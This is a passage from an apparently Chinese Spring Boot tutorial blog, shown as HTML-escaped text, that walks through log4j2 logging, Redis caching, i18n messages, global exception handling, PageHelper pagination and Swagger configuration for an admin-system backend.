\u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!-- \u0026lt;TimeBasedTriggeringPolicy interval=\u0026#34;1\u0026#34; modulate=\u0026#34;true\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026amp;lt;!\u0026amp;ndash; 文件大小 \u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!-- \u0026lt;SizeBasedTriggeringPolicy size=\u0026#34;100 MB\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;/Policies\u0026gt;--\u0026gt; \u0026lt;!-- \u0026amp;lt;!\u0026amp;ndash; DefaultRolloverStrategy属性如不设置，则默认为最多同一文件夹下7个文件开始覆盖\u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!-- \u0026lt;DefaultRolloverStrategy max=\u0026#34;15\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/RollingFile\u0026gt;--\u0026gt; \u0026lt;!-- info级别日志文件输出 --\u0026gt; \u0026lt;RollingFile name=\u0026#34;info_appender\u0026#34; fileName=\u0026#34;${baseDir}/info.log\u0026#34; filePattern=\u0026#34;${baseDir}/info_%i.log.%d{yyyy-MM-dd}\u0026#34;\u0026gt; \u0026lt;!-- 过滤器 --\u0026gt; \u0026lt;Filters\u0026gt; \u0026lt;!-- 限制日志级别在info及以上在error以下 --\u0026gt; \u0026lt;ThresholdFilter level=\u0026#34;info\u0026#34;/\u0026gt; \u0026lt;ThresholdFilter level=\u0026#34;error\u0026#34; onMatch=\u0026#34;DENY\u0026#34; onMismatch=\u0026#34;NEUTRAL\u0026#34;/\u0026gt; \u0026lt;/Filters\u0026gt; \u0026lt;!-- 日志格式 --\u0026gt; \u0026lt;PatternLayout pattern=\u0026#34;${LOG_PATTERN}\u0026#34;/\u0026gt; \u0026lt;!-- 策略 --\u0026gt; \u0026lt;Policies\u0026gt; \u0026lt;!-- 每隔一天转存 --\u0026gt; \u0026lt;TimeBasedTriggeringPolicy interval=\u0026#34;1\u0026#34; modulate=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;!-- 文件大小 --\u0026gt; \u0026lt;SizeBasedTriggeringPolicy size=\u0026#34;100 MB\u0026#34;/\u0026gt; \u0026lt;/Policies\u0026gt; \u0026lt;!-- DefaultRolloverStrategy属性如不设置，则默认为最多同一文件夹下7个文件开始覆盖--\u0026gt; \u0026lt;DefaultRolloverStrategy max=\u0026#34;15\u0026#34;/\u0026gt; \u0026lt;/RollingFile\u0026gt; \u0026lt;!-- error级别日志文件输出 --\u0026gt; \u0026lt;RollingFile name=\u0026#34;error_appender\u0026#34; fileName=\u0026#34;${baseDir}/error.log\u0026#34; filePattern=\u0026#34;${baseDir}/error_%i.log.%d{yyyy-MM-dd}\u0026#34;\u0026gt; \u0026lt;!-- 过滤器 --\u0026gt; \u0026lt;Filters\u0026gt; \u0026lt;!-- 限制日志级别在error及以上 --\u0026gt; \u0026lt;ThresholdFilter level=\u0026#34;error\u0026#34;/\u0026gt; \u0026lt;/Filters\u0026gt; \u0026lt;!-- 日志格式 --\u0026gt; \u0026lt;PatternLayout pattern=\u0026#34;${LOG_PATTERN}\u0026#34;/\u0026gt; \u0026lt;Policies\u0026gt; \u0026lt;!-- 每隔一天转存 --\u0026gt; \u0026lt;TimeBasedTriggeringPolicy interval=\u0026#34;1\u0026#34; modulate=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;!-- 文件大小 --\u0026gt; \u0026lt;SizeBasedTriggeringPolicy size=\u0026#34;100 MB\u0026#34;/\u0026gt; \u0026lt;/Policies\u0026gt; \u0026lt;!-- DefaultRolloverStrategy属性如不设置，则默认为最多同一文件夹下7个文件开始覆盖--\u0026gt; \u0026lt;DefaultRolloverStrategy max=\u0026#34;15\u0026#34;/\u0026gt; \u0026lt;/RollingFile\u0026gt; \u0026lt;/Appenders\u0026gt; \u0026lt;!--Logger节点用来单独指定日志的形式，比如要为指定包下的class指定不同的日志级别等。--\u0026gt; \u0026lt;!--然后定义loggers，只有定义了logger并引入的appender，appender才会生效--\u0026gt; \u0026lt;!--监控系统信息--\u0026gt; \u0026lt;!--若是additivity设为false，则 子Logger 只会在自己的appender里输出，而不会在 父Logger 的appender里输出。--\u0026gt; \u0026lt;Loggers\u0026gt; \u0026lt;!--过滤掉spring和mybatis的一些无用的DEBUG信息--\u0026gt; \u0026lt;logger name=\u0026#34;org.mybatis\u0026#34; level=\u0026#34;info\u0026#34; additivity=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;AppenderRef ref=\u0026#34;Console\u0026#34;/\u0026gt; \u0026lt;/logger\u0026gt; \u0026lt;Logger name=\u0026#34;org.springframework\u0026#34; level=\u0026#34;WARN\u0026#34; additivity=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;AppenderRef ref=\u0026#34;Console\u0026#34;/\u0026gt; \u0026lt;/Logger\u0026gt; \u0026lt;!--pagehelper日志输出限制--\u0026gt; \u0026lt;!--\u0026lt;Logger name=\u0026#34;com.github.pagehelper\u0026#34; level=\u0026#34;info\u0026#34; additivity=\u0026#34;false\u0026#34;\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;AppenderRef ref=\u0026#34;Console\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!--\u0026lt;/Logger\u0026gt;--\u0026gt; \u0026lt;!-- 设置com.zaxxer.hikari包下的日志只打印WARN及以上级别的日志 --\u0026gt; \u0026lt;logger name=\u0026#34;com.zaxxer.hikari\u0026#34; level=\u0026#34;WARN\u0026#34; additivity=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;appender-ref ref=\u0026#34;Console\u0026#34;/\u0026gt; \u0026lt;/logger\u0026gt; \u0026lt;!-- 设置org.hibernate.validator包下的日志只打印WARN及以上级别的日志 --\u0026gt; \u0026lt;logger name=\u0026#34;org.hibernate.validator\u0026#34; level=\u0026#34;WARN\u0026#34; additivity=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;appender-ref ref=\u0026#34;Console\u0026#34;/\u0026gt; \u0026lt;/logger\u0026gt; \u0026lt;!-- 设置org.apache包下的日志只打印WARN及以上级别的日志 --\u0026gt; \u0026lt;!-- \u0026lt;logger name=\u0026#34;org.apache\u0026#34; level=\u0026#34;WARN\u0026#34; additivity=\u0026#34;false\u0026#34;\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;appender-ref ref=\u0026#34;Console\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;/logger\u0026gt;--\u0026gt; \u0026lt;Root level=\u0026#34;info\u0026#34;\u0026gt; \u0026lt;AppenderRef ref=\u0026#34;Console\u0026#34;/\u0026gt; \u0026lt;AppenderRef ref=\u0026#34;debug_appender\u0026#34;/\u0026gt; \u0026lt;AppenderRef ref=\u0026#34;info_appender\u0026#34;/\u0026gt; \u0026lt;AppenderRef ref=\u0026#34;error_appender\u0026#34;/\u0026gt; \u0026lt;/Root\u0026gt; \u0026lt;/Loggers\u0026gt; \u0026lt;/Configuration\u0026gt; 参考链接：\nlog4j2.xml 的标签 loggers 中 root 的属性 level 指的是什么\n整合Redis缓存 1. 添加依赖 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!--redis 缓存操作 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-data-redis\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--pool 对象池 --\u0026gt; \u0026lt;!-- spring2.0集成redis所需common-pool2 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-pool2\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 2. Redis数据库连接信息配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 spring: redis: # Redis默认情况下有16个分片，这里配置具体使用的分片，默认是0 database: 0 host: localhost port: 6379 # 连接密码（默认为空） password: # 连接超时时间（毫秒) timeout: 50ms lettuce: pool: # 连接池最大连接数（使用负值表示没有限制） 默认 8 max-active: 8 # 连接池最大阻塞等待时间（使用负值表示没有限制） 默认 -1 max-wait: -1 # 连接池中的最大空闲连接 默认 8 max-idle: 8 # 连接池中的最小空闲连接 默认 0 min-idle: 0 3. 在RedisConfig中自定义RedisTemplate解决序列化问题 这里使用jackon。fastjson出事太多了，实际业务开发中尽量少用为妙\nfastjson到底做错了什么？为什么会被频繁爆出漏洞？\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 @Configuration @EnableCaching public class RedisConfig { @Bean public RedisTemplate\u0026lt;String, Object\u0026gt; template(RedisConnectionFactory factory) { // 创建RedisTemplate\u0026lt;String, Object\u0026gt;对象 RedisTemplate\u0026lt;String, Object\u0026gt; template = new RedisTemplate\u0026lt;\u0026gt;(); // 配置连接工厂 template.setConnectionFactory(factory); // redis key 序列化方式使用stringSerial template.setKeySerializer(new StringRedisSerializer()); // redis value 序列化方式自定义 // template.setValueSerializer(new GenericFastJsonRedisSerializer()); template.setValueSerializer(valueSerializer()); // redis hash key 序列化方式使用stringSerial template.setHashKeySerializer(new StringRedisSerializer()); // redis hash value 序列化方式自定义 // template.setHashValueSerializer(new GenericFastJsonRedisSerializer()); template.setHashValueSerializer(valueSerializer()); return template; } private RedisSerializer\u0026lt;Object\u0026gt; valueSerializer() { Jackson2JsonRedisSerializer\u0026lt;Object\u0026gt; jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer\u0026lt;\u0026gt;(Object.class); ObjectMapper objectMapper = new ObjectMapper(); objectMapper.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY); // 此项必须配置，否则如果序列化的对象里边还有对象，会报如下错误： // java.lang.ClassCastException: java.util.LinkedHashMap cannot be cast to XXX objectMapper.activateDefaultTyping( objectMapper.getPolymorphicTypeValidator(), ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY); // 旧版写法： // objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY); jackson2JsonRedisSerializer.setObjectMapper(objectMapper); return jackson2JsonRedisSerializer; } } 使用jackson在进行序列化反序列化时 redis报错： Could not read JSON: Unrecognized field “enabled“\n参考链接：https://blog.csdn.net/qq_41706331/article/details/119242055\n原因：序列化时多了几个字段，这是因为为了整合springsecurity在User类中实现了UserDetails接口，重写了这些方法\n解决：使用@JsonIgnoreProperties注解，可以在User对象在序列化时忽略这些字段。在User类前添加：\n1 @JsonIgnoreProperties({\u0026#34;enabled\u0026#34;,\u0026#34;accountNonExpired\u0026#34;, \u0026#34;accountNonLocked\u0026#34;, \u0026#34;credentialsNonExpired\u0026#34;, \u0026#34;authorities\u0026#34;}) 4. 封装RedisUtils \u0026ndash; Redis常用命令工具类 5.Redis测试使用 在lab-admin中扫描common模块的bean（因为springboot的@SpringBootApplication注解默认扫描范围为自己的启动类所在的包及其子包）\n参考链接：\nSpringBoot多模块项目中无法注入其他模块中的spring bean\n1 2 3 4 5 6 7 8 @Configuration // 表示通过aop框架暴露该代理对象,AopContext能够访问 @EnableAspectJAutoProxy(exposeProxy = true) // 扫描common模块的bean @ComponentScan(value = {\u0026#34;org.opengms.common\u0026#34;}) public class ApplicationConfig { } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 @Autowired private RedisUtils redisUtils; @GetMapping(\u0026#34;/helloRedis\u0026#34;) public String helloRedis(){ // 测试写入一个string类型键值,过期时间20S redisUtils.set(\u0026#34;key1\u0026#34;, \u0026#34;Gangbb\u0026#34;, 20); System.out.println(\u0026#34;获取key1值\u0026#34;+ redisUtils.set(\u0026#34;key1\u0026#34;, \u0026#34;测试redis\u0026#34;, 20)); return \u0026#34;测试redis\u0026#34;; } @Cacheable(\u0026#34;cache1\u0026#34;) @GetMapping(\u0026#34;/helloRedis2\u0026#34;) public String helloRedis2(){ return \u0026#34;xxredis\u0026#34;; } @Cacheable(\u0026#34;cache2\u0026#34;) @GetMapping(\u0026#34;/helloRedis3\u0026#34;) public JSONObject helloRedis3(){ return getTestDetail(); } public JSONObject getTestDetail() { JSONObject retJson = new JSONObject(); String retCode = \u0026#34;1\u0026#34;; String retMsg = \u0026#34;操作失败！\u0026#34;; JSONObject bizDataJson = new JSONObject(); try { User user = new User(); user.setUserId(22L); user.setUserName(\u0026#34;bin\u0026#34;); user.setEmail(\u0026#34;78280@qq.com\u0026#34;); String key = \u0026#34;user::\u0026#34;+user.getUserId(); //向Redis中缓存数据，-1为设置永久时效 // redisUtils.set(key, user,-1); bizDataJson = JSONObject.parseObject(JSON.toJSONString(user)); retCode = \u0026#34;0\u0026#34;; retMsg = \u0026#34;操作成功！\u0026#34;; } catch (Exception e) { log.error(String.valueOf(e)); } retJson.put(\u0026#34;retCode\u0026#34;, retCode); retJson.put(\u0026#34;retMsg\u0026#34;, retMsg); retJson.put(\u0026#34;bizData\u0026#34;, bizDataJson); return retJson; } 参考链接：\nspring boot 缓存@EnableCaching\n使用@Cacheable时存到redis中的数据是Hex格式的\n解决：@EnableCaching与@Cacheable的使用方法，结合redis进行说明\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 @Configuration @EnableCaching public class RedisConfig { @Bean public CacheManager cacheManager(RedisConnectionFactory factory){ //Duration.ofSeconds(120)设置缓存默认过期时间120秒 RedisCacheConfiguration config = RedisCacheConfiguration.defaultCacheConfig().entryTtl(Duration.ofSeconds(120)); //解决使用@Cacheable，redis数据库value乱码 config = config.serializeValuesWith(RedisSerializationContext.SerializationPair.fromSerializer(RedisSerializer.json())); RedisCacheManager cacheManager = RedisCacheManager.builder(factory).cacheDefaults(config).build(); return cacheManager; } } 6. Mybatis使用Redis做二级缓存 还未实现\n参考链接：\n从零搭建若依(Ruoyi-Vue)管理系统(6)\u0026ndash;整合Redis缓存\n国际化消息处理 1. 设置项目文件编码 需要将properties的文件编码设置成utf-8，否则会出现乱码????\n2. 新建一个Resourse Bundle 在lab-admin的resources目录下新建i8n文件夹储存所有国际化文本属性。 新建messages Resourse Bundle 参考链接：\nidea 2021. 2.3 中使用springboot 国际化 Resource Bundle不显示问题\n2. 国际化工具类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class MessageUtils { /** * 根据消息键和参数 获取消息 委托给spring messageSource * * @param code 消息键 * @param args 参数 * @return 获取国际化翻译值 */ public static String message(String code, Object... args) { MessageSource messageSource = SpringUtils.getBean(MessageSource.class); try { return messageSource.getMessage(code, args, LocaleContextHolder.getLocale()); } catch (Exception e) { return code; } } } 4. 测试使用 前端请求接口时在请求头Accept-Language附带语言信息（中文：zh-cn；英文：en-us；不设置默认中文）注意中间是一个横杠不是下划线，与properties文件有区别\n1 2 3 4 @GetMapping(\u0026#34;/message\u0026#34;) public String test() { return MessageUtils.message(\u0026#34;user.login.success\u0026#34;); } 统一对象返回和异常处理 1. 定义统一返回对象 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 public class ApiResponse extends HashMap\u0026lt;String, Object\u0026gt; { private static final long serialVersionUID = 1L; /** 状态码 */ public static final String CODE_TAG = \u0026#34;code\u0026#34;; /** 返回内容 */ public static final String MSG_TAG = \u0026#34;msg\u0026#34;; /** 数据对象 */ public static final String DATA_TAG = \u0026#34;data\u0026#34;; /** * 初始化一个新创建的 ApiResponse 对象，使其表示一个空消息。 */ public ApiResponse() { } /** * 初始化一个新创建的 ApiResponse 对象 * * @param code 状态码 * @param msg 返回内容 */ public ApiResponse(int code, String msg) { super.put(CODE_TAG, code); super.put(MSG_TAG, msg); } /** * 初始化一个新创建的 ApiResponse 对象 * * @param code 状态码 * @param msg 返回内容 * @param data 数据对象 */ public ApiResponse(int code, String msg, Object data) { super.put(CODE_TAG, code); super.put(MSG_TAG, msg); if (StringUtils.isNotNull(data)) { super.put(DATA_TAG, data); } } /** * 返回成功消息 * * @return 成功消息 */ public static ApiResponse success() { return ApiResponse.success(\u0026#34;操作成功\u0026#34;); } /** * 返回成功数据 * * @return 成功消息 */ public static ApiResponse success(Object data) { return ApiResponse.success(\u0026#34;操作成功\u0026#34;, data); } /** * 返回成功消息 * * @param msg 返回内容 * @return 成功消息 */ public static ApiResponse success(String msg) { return ApiResponse.success(msg, null); } /** * 返回成功消息 * * @param msg 返回内容 * @param data 数据对象 * @return 成功消息 */ public static ApiResponse success(String msg, Object data) { return new ApiResponse(HttpStatus.SUCCESS, msg, data); } /** * 返回错误消息 * * @return */ public static ApiResponse error() { return ApiResponse.error(\u0026#34;操作失败\u0026#34;); } /** * 返回错误消息 * * @param msg 返回内容 * @return 警告消息 */ public static ApiResponse error(String msg) { return ApiResponse.error(msg, null); } /** * 返回错误消息 * * @param msg 返回内容 * @param data 数据对象 * @return 警告消息 */ public static ApiResponse error(String msg, Object data) { return new ApiResponse(HttpStatus.ERROR, msg, data); } /** * 返回错误消息 * * @param code 状态码 * @param msg 返回内容 * @return 警告消息 */ public static ApiResponse error(int code, String msg) { return new ApiResponse(code, msg, null); } /** * 方便链式调用 * * @param key 键 * @param value 值 * @return 数据对象 */ @Override public ApiResponse put(String key, Object value) { super.put(key, value); return this; } } 2. 自定义异常类及错误码规范 定义一个自定义异常类，抛出时传入不同的状态码 ，通过不同状态码以及messages.properties中对应的错误信息区分不同异常。只要对状态码有一个统一定义规范就能有效区分不同异常进行管理\n自定义异常类ServiceException\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public final class ServiceException extends RuntimeException { private static final long serialVersionUID = 1L; /** * 错误码 */ private Integer code; /** * 错误提示 */ private String message; } message.properties\n1 2 3 4 5 6 7 user.email.not.valid=邮箱格式错误 user.mobile.phone.number.not.valid=手机号格式错误 user.login.success=登录成功 user.register.success=注册成功 user.notfound=请重新登录 user.forcelogout=管理员强制退出，请重新登录 user.unknown.error=未知错误，请重新登录 3. 全局异常处理 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 @Slf4j @RestControllerAdvice public class GlobalExceptionHandler { /** * 业务异常 */ @ExceptionHandler(ServiceException.class) public ApiResponse handleServiceException(ServiceException e, HttpServletRequest request) { String requestURI = request.getRequestURI(); log.error(\u0026#34;请求地址[ {} ],发生业务异常.\u0026#34;, requestURI, e); Integer code = e.getCode(); return StringUtils.isNotNull(code) ? ApiResponse.error(code, e.getMessage()) : ApiResponse.error(e.getMessage()); } /** * 拦截未知的运行时异常 */ @ExceptionHandler(RuntimeException.class) public ApiResponse handleRuntimeException(RuntimeException e, HttpServletRequest request) { String requestURI = request.getRequestURI(); log.error(\u0026#34;请求地址[ {} ],发生未知异常.\u0026#34;, requestURI, e); return ApiResponse.error(e.getMessage()); } /** * 系统异常 */ @ExceptionHandler(Exception.class) public ApiResponse handleException(Exception e, HttpServletRequest request) { String requestURI = request.getRequestURI(); log.error(\u0026#34;请求地址[ {} ],发生系统异常.\u0026#34;, requestURI, e); return ApiResponse.error(e.getMessage()); } } 4. 异常测试 1 2 3 4 5 6 7 8 9 10 11 12 @GetMapping(\u0026#34;/exception\u0026#34;) public ApiResponse exception() { int a = 1; int b = 0; if (b == 0){ throw new ServiceException(MessageUtils.message(\u0026#34;service.division.byZero\u0026#34;)); } return ApiResponse.success(a / 0.5); } Mybatias分页支持 1. 引入依赖 1 2 3 4 5 6 7 \u0026lt;dependencies\u0026gt; \u0026lt;!-- pagehelper 分页插件 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.pagehelper\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;pagehelper-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; 2. 配置yml 1 2 3 4 5 6 7 8 9 10 11 # PageHelper分页插件 pagehelper: # 指定分页插件使用哪种数据库方言 helperDialect: mysql # 当该参数设置为 true 时，pageNum\u0026lt;=0 时会查询第一页， pageNum\u0026gt;pages（超过总数时），会查询最后一页。 # reasonable: true # 支持通过 Mapper 接口参数来传递分页参数，默认值false，分页插件会从查询方法的参数值中， # 自动根据上面 params 配置的字段中取值，查找到合适的值时就会自动分页。 supportMethodsArguments: true # 增加了该参数来配置参数映射，用于从对象中根据属性名取值 params: count=countSql 所有配置项：\nhelperDialect：分页插件会自动检测当前的数据库链接，自动选择合适的分页方式。 你可以配置helperDialect属性来指定分页插件使用哪种方言。配置时，可以使用下面的缩写值： oracle,mysql,mariadb,sqlite,hsqldb,postgresql,db2,sqlserver,informix,h2,sqlserver2012,derby **特别注意：**使用 SqlServer2012 数据库时，需要手动指定为 sqlserver2012，否则会使用 SqlServer2005 的方式进行分页。 你也可以实现 AbstractHelperDialect，然后配置该属性为实现类的全限定名称即可使用自定义的实现方法。 offsetAsPageNum：默认值为 false，该参数对使用 RowBounds 作为分页参数时有效。 当该参数设置为 true 时，会将 RowBounds 中的 offset 参数当成 pageNum 使用，可以用页码和页面大小两个参数进行分页。 rowBoundsWithCount：默认值为false，该参数对使用 RowBounds 作为分页参数时有效。 当该参数设置为true时，使用 RowBounds 分页会进行 count 查询。 pageSizeZero：默认值为 false，当该参数设置为 true 时，如果 pageSize=0 或者 RowBounds.limit = 0 就会查询出全部的结果（相当于没有执行分页查询，但是返回结果仍然是 Page 类型）。 reasonable：分页合理化参数，默认值为false。当该参数设置为 true 时，pageNum\u0026lt;=0 时会查询第一页， pageNum\u0026gt;pages（超过总数时），会查询最后一页。默认false 时，直接根据参数进行查询。 params：为了支持startPage(Object params)方法，增加了该参数来配置参数映射，用于从对象中根据属性名取值， 可以配置 pageNum,pageSize,count,pageSizeZero,reasonable，不配置映射的用默认值， 默认值为pageNum=pageNum;pageSize=pageSize;count=countSql;reasonable=reasonable;pageSizeZero=pageSizeZero。 supportMethodsArguments：支持通过 Mapper 接口参数来传递分页参数，默认值false，分页插件会从查询方法的参数值中，自动根据上面 params 配置的字段中取值，查找到合适的值时就会自动分页。 使用方法可以参考测试代码中的 com.github.pagehelper.test.basic 包下的 ArgumentsMapTest 和 ArgumentsObjTest。 autoRuntimeDialect：默认值为 false。设置为 true 时，允许在运行时根据多数据源自动识别对应方言的分页 （不支持自动选择sqlserver2012，只能使用sqlserver），用法和注意事项参考下面的场景五。 closeConn：默认值为 true。当使用运行时动态数据源或没有设置 helperDialect 属性自动获取数据库类型时，会自动获取一个数据库连接， 通过该属性来设置是否关闭获取的这个连接，默认true关闭，设置为 false 后，不会关闭获取的连接，这个参数的设置要根据自己选择的数据源来决定。 aggregateFunctions(5.1.5+)：默认为所有常见数据库的聚合函数，允许手动添加聚合函数（影响行数），所有以聚合函数开头的函数，在进行 count 转换时，会套一层。其他函数和列会被替换为 count(0)，其中count列可以自己配置。 更多信息可以可以看官方文档：\nhttps://github.com/pagehelper/Mybatis-PageHelper/blob/master/wikis/zh/HowToUse.md\n3. 封装分页相关工具 3.1 BaseController 这是一个web层通用处理类。核心方法startPage()请求分页数据方法，使继承BaseController的Controller可以快速使用分页。\n参考链接：\nspringMVC之@InitBinder的用法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 @Slf4j public class BaseController { // protected final Logger logger = LoggerFactory.getLogger(this.getClass()); /** * 将前台传递过来的日期格式的字符串，自动转化为Date类型 */ @InitBinder public void initBinder(WebDataBinder binder) { // Date 类型转换 binder.registerCustomEditor(Date.class, new PropertyEditorSupport() { @Override public void setAsText(String text) { setValue(DateUtils.parseDate(text)); } }); } /** * 设置请求分页数据 */ protected void startPage() { PageUtils.startPage(); } /** * 设置请求排序数据 */ protected void startOrderBy() { PageDomain pageDomain = TableSupport.buildPageRequest(); if (StringUtils.isNotEmpty(pageDomain.getOrderBy())) { String orderBy = SqlUtil.escapeOrderBySql(pageDomain.getOrderBy()); PageHelper.orderBy(orderBy); } } /** * 清理分页的线程变量 */ protected void clearPage() { PageUtils.clearPage(); } /** * 响应请求分页数据 */ @SuppressWarnings({ \u0026#34;rawtypes\u0026#34;, \u0026#34;unchecked\u0026#34; }) protected TableDataInfo getDataTable(List\u0026lt;?\u0026gt; list) { TableDataInfo rspData = new TableDataInfo(); rspData.setCode(HttpStatus.SUCCESS); rspData.setMsg(\u0026#34;查询成功\u0026#34;); rspData.setRows(list); rspData.setTotal(new PageInfo(list).getTotal()); return rspData; } } 3.2 TableDataInfo 自定义分页结果\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public class TableDataInfo implements Serializable { private static final long serialVersionUID = 1L; /** 总记录数 */ private long total; /** 列表数据 */ private List\u0026lt;?\u0026gt; rows; /** 消息状态码 */ private int code; /** 消息内容 */ private String msg; } 3.3 数据传输类PageDTO 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public class PageDTO { /** 当前记录起始索引 */ private Integer pageNum; /** 每页显示记录数 */ private Integer pageSize; /** 排序列 */ private String orderByColumn; /** 排序的方向desc或者asc */ private String isAsc = \u0026#34;asc\u0026#34;; /** 分页参数合理化 */ private Boolean reasonable = true } 4. 测试 1 2 3 4 5 6 7 8 9 10 11 12 /** * 查询列表，分页。 返回 TableDataInfo * @return */ @GetMapping(\u0026#34;/page\u0026#34;) public TableDataInfo testPageHelper(){ startPage(); List\u0026lt;SysOperLog\u0026gt; sysOperationLogs = sysOperLogService.selectAll(); return getDataTable(sysOperationLogs); }\t1 2 3 \u0026lt;select id=\u0026#34;selectAll\u0026#34; resultType=\u0026#34;SysOperLog\u0026#34;\u0026gt; select * from sys_oper_log \u0026lt;/select\u0026gt; Swagger集成 1.pom依赖 父级pom\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;properties\u0026gt; \u0026lt;swagger.version\u0026gt;3.0.0\u0026lt;/swagger.version\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;!-- Swagger3依赖 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.springfox\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;springfox-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${swagger.version}\u0026lt;/version\u0026gt; \u0026lt;exclusions\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;groupId\u0026gt;io.swagger\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;swagger-models\u0026lt;/artifactId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;/exclusions\u0026gt; \u0026lt;/dependency\u0026gt; admin pom\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;!-- swagger3--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.springfox\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;springfox-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- 防止进入swagger页面报类型转换错误，排除3.0.0中的引用，手动增加1.6.2版本 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.swagger\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;swagger-models\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.6.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 2.swagger config 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 @Configuration public class SwaggerConfig implements WebMvcConfigurer { /** 系统基础配置 */ @Autowired private LabConfig labConfig; /** 是否开启swagger */ @Value(\u0026#34;${swagger.enabled}\u0026#34;) private boolean enabled; /** * 创建API */ @Bean public Docket createRestApi() { return new Docket(DocumentationType.OAS_30) // 是否启用Swagger .enable(enabled) // 用来创建该API的基本信息，展示在文档的页面中（自定义展示的信息） .apiInfo(apiInfo()) // 设置哪些接口暴露给Swagger展示 .select() // 扫描所有有注解的api，用这种方式更灵活 .apis(RequestHandlerSelectors.withMethodAnnotation(ApiOperation.class)) // 扫描指定包中的swagger注解 // .apis(RequestHandlerSelectors.basePackage(\u0026#34;com.opengms.project.tool.swagger\u0026#34;)) // 扫描所有 .apis(RequestHandlerSelectors.any()) .paths(PathSelectors.any()) .build() /* 设置安全模式，swagger可以设置访问token */ .securitySchemes(securitySchemes()) 